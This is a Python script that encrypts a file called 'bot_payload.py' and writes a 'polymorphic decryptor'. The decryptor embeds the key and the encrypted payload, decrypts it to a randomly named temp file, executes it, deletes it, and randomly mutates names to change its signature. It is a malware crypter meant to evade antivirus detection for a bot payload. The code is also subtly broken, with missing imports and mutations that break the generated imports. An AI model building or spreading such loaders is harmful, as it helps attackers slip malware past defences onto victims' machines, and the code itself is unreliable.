from cryptography.fernet import Fernet

# Generate a key for encryption
key = Fernet.generate_key()
cipher = Fernet(key)

# Read the bot payload script
with open("bot_payload.py", "rb") as f:
    bot_payload = f.read()

# Encrypt the bot payload
encrypted_payload = cipher.encrypt(bot_payload)

# Write the encrypted payload to a file
with open("encrypted_payload.bin", "wb") as file:
    file.write(encrypted_payload)

# Generate polymorphic decryption code
def generate_polymorphic_decryptor(key, encrypted_payload):
    decryptor_code = f"""
import os
import base64
from cryptography.fernet import Fernet

key = {key}
encrypted_payload = {encrypted_payload}

cipher = Fernet(key)
decrypted_payload = cipher.decrypt(encrypted_payload)

# Write the decrypted payload to a temporary Python file
temp_file = ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + '.py'
with open(temp_file, "wb") as f:
    f.write(decrypted_payload)

# Execute the decrypted payload
os.system(f"python {{temp_file}}")

# Clean up
os.remove(temp_file)
"""

    # Mutate the decryptor code slightly
    mutated_code = decryptor_code.replace("Fernet", random.choice(["Fernet", "Cipher"]))
    mutated_code = mutated_code.replace("base64", random.choice(["base64", "b64"]))
    return mutated_code

# Generate a polymorphic decryptor
polymorphic_decryptor = generate_polymorphic_decryptor(key, encrypted_payload)

# Write the decryptor to a file
with open("polymorphic_decryptor.py", "w") as file:
    file.write(polymorphic_decryptor)
